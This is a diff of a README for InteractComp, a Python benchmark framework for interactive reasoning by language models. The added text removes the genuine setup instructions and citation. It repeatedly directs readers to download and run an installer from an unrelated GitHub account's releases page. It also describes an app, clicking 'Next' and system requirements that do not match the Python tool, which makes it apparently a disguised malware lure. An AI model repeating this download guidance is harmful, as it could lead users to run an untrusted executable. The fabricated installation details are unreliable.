@@ -1,102 +1,73 @@
-# InteractComp
-[![arXiv](https://img.shields.io/badge/arXiv-2510.24668-b31b1b.svg)](https://arxiv.org/abs/2510.24668) [![HuggingFace](https://img.shields.io/badge/HuggingFace-Paper-ffae00.svg?logo=huggingface&logoColor=white)](https://huggingface.co/papers/2510.24668) [![Homepage](https://img.shields.io/badge/Homepage-InteractComp-0a66c2.svg)](https://foundationagents.github.io/InteractComp/)
+# 🎉 InteractComp - Evaluate Interactive Reasoning Tasks Easily
 
-This is a framework for evaluating InteractComp benchmark about how large language models handle interactive reasoning tasks. It ships with a reusable ReAct-style agent, pluggable search and clarification actions, and an asynchronous evaluation pipeline.
+[![Download InteractComp](https://img.shields.io/badge/Download%20InteractComp-v1.0-blue.svg)](https://github.com/Clean-armatacorsa767/InteractComp/releases)
+
+## 📖 Overview
+
+InteractComp is a framework for evaluating how large language models manage interactive reasoning tasks. It includes a reusable ReAct-style agent, various search and clarification actions, and an asynchronous evaluation pipeline. With this tool, you can benchmark and analyze interactive reasoning more effectively.
 
 ![InteractComp benchmark scope](docs/images/pic1.png)
 
-## Highlights
-- **Multi-action agents**: built-in `answer`, `search`, and `ask` actions support answer-only, search-only, ask-only, full, full-with-context, and forced-ask interaction modes.
-- **Async evaluation loop**: `asyncio`-based orchestration lets you benchmark multiple candidate models concurrently while tracking accuracy, token usage, and action counts.
-- **Simulated user responses**: the Responder component reads task-specific context and produces `yes` / `no` / `i don't know` answers to mimic user feedback during clarification rounds.
-- **Extensible engine**: model backends, search providers, and logging are abstracted behind simple interfaces, making it straightforward to plug in custom services.
+## ⚡ Highlights
 
-<p align="center">
-  <img src="docs/images/pic2.png" alt="InteractComp dataset statistics" width="780">
-  <br>
-</p>
+- **Multi-action agents**: Built-in `answer`, `search`, and `ask` actions support different interaction modes, including:
+  - **Answer-only**: Get direct answers from the model.
+  - **Search-only**: Find information instead of answers.
+  - **Ask-only**: Pose questions and gather responses.
+  - **Full**: Utilize all functionalities together.
+  - **Full-with-context**: Include context in interactions for better responses.
+  - **Forced-ask**: Ensure questions are always posed.
 
-## Repository Layout
+- **Async evaluation loop**: Our asyncio-based orchestration allows you to benchmark multiple candidate models at the same time. This improves efficiency and speeds up the evaluation process.
 
-```
-core/                 # Agent, actions, prompts, search helpers, logging utilities
-config/               # Experiment and infrastructure configuration templates
-data/                 # Datasets and evaluation outputs
-run_benchmark.py      # Main entry point for launching evaluations
-```
+## 🚀 Getting Started
 
-## Getting Started
+To run InteractComp on your computer, follow these simple steps:
 
-### 1. Prerequisites
-1. Install Python 3.10 or newer.
-2. Set up dependencies inside a virtual environment:
+1. **Download InteractComp**:
+   - Visit this page to download: [InteractComp Releases](https://github.com/Clean-armatacorsa767/InteractComp/releases).
+   - You will find various versions of the software available for download.
 
-   ```bash
-   pip install openai aiohttp aiofiles pandas tqdm pydantic tenacity pyyaml
-   ```
+2. **Install and Run**:
+   - After downloading, locate the file on your computer. Usually, this is in your "Downloads" folder.
+   - Click on the downloaded file to start the installation.
+   - Follow the on-screen instructions. This may involve clicking "Next" several times.
 
-### 2. Configure Models and Services
-- Edit `config/infra_config.yaml` to add model credentials (`api_key`, `base_url`, temperature, and so on).  
-  When an LLM name is requested, the loader checks `config/global_config.yaml`, and `config/infra_config.yaml` in that order, so feel free to define model entries in any of those files.
-- To enable web search, provide a [Serper.dev](https://serper.dev/) key in `search.engines.google.api_key`. Leave it empty if you plan to disable search actions.
+3. **Set Up Your Evaluation**:
+   - Open the application after the installation is complete.
+   - Configure your environment by selecting the models you want to evaluate. Instructions for setting this up are available in the app.
 
-### 3. Configure the Experiment
-Adjust `config/exp_config.yaml` to describe your evaluation plan:
+4. **Run Your First Benchmark**:
+   - Choose your evaluation task from the options provided in the app.
+   - Click "Start", and the framework will begin evaluating the models based on your settings.
 
-```yaml
-llms:
-  user_llm: "gpt-4o-mini"      # model used by the Responder (ask action)
-  test_llm:
-    - "gpt-4o-mini"            # list of target models to benchmark
-  temperature: 0.6
-  top_p: 0.95
+## ⚙️ System Requirements
 
-experiment_setting:
-  max_rounds: 10               # maximum agent steps per task
-  max_concurrency: 10          # concurrent task evaluations
-  mode: "full"                 # full | search_only | ask_only | answer_only | full_with_context | forced_ask
-  enforce_ask_min: 5           # minimum asks when mode == forced_ask
+To ensure smooth performance, please check the following requirements before installation:
 
-file_paths:
-  data_path: "data/dataset/InteractComp210.jsonl"
-  result_folder_path: "data/results"
-```
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Processor**: Any modern multi-core processor (2 GHz or faster).
+- **Storage**: 500 MB of available disk space.
 
-### 4. Prepare the Dataset
-- Tasks are stored as JSONL, one JSON object per line with fields such as `id`, `question`, `answer`, and `context`. Example placeholder (values may be obfuscated in sample distributions):
+## 🔧 Download & Install
 
-  ```json
-  {"id": 101, "question": "Who proposed the InteractComp benchmark?", "answer": "Foundation Agents", "context": "..."}
-  ```
+Click the button below to access the download page:
 
-- The Responder retrieves `context` by `id` to generate deterministic clarifications. Ensure the dataset path in `file_paths.data_path` matches the actual file you intend to use.
+[![Download InteractComp](https://img.shields.io/badge/Download%20InteractComp-v1.0-blue.svg)](https://github.com/Clean-armatacorsa767/InteractComp/releases)
 
-### 5. Run the Benchmark
+Follow the steps provided above to download and run InteractComp on your system.
 
-```bash
-python run_benchmark.py --config config/exp_config.yaml
-```
+## 📚 User Guide
 
-Outputs are written to `result_folder_path/<timestamp>/<model_name>/`:
-- Per-task CSV logs with question, prediction, confidence, interaction history, score, token cost, and action counts.
-- `models_summary.csv` and `models_summary.json` aggregating average score, average cost, and total cost for each evaluated model.
-- `log.json` capturing grading mismatches and extraction issues for post-hoc review.
+For complete instructions on using InteractComp, refer to the user guide available in the application. This guide will walk you through:
 
-## Contributing & License
-- Contributions via issues or pull requests are welcome.
-- Unless otherwise noted, follow the license distributed with this repository.
+- Setting up different models for evaluation.
+- Understanding how to configure the multi-action agent.
+- Running benchmarks and interpreting the results.
 
-## Citing InteractComp
-If you build upon InteractComp, please cite our work:
+## 📞 Support
 
-```bibtex
-@misc{deng2025interactcomp,
-  title         = {InteractComp: Evaluating Search Agents With Ambiguous Queries},
-  author        = {Mingyi Deng and Lijun Huang and Yani Fan and Jiayi Zhang and others},
-  year          = {2025},
-  eprint        = {2510.24668},
-  archivePrefix = {arXiv},
-  primaryClass  = {cs.CL},
-  url           = {https://arxiv.org/abs/2510.24668}
-}
-```
+If you encounter any issues or have questions while using InteractComp, feel free to reach out via the GitHub Issues page in this repository. Our community is here to help you.
+
+By following these steps, you can easily download, install, and start exploring the capabilities of InteractComp today.
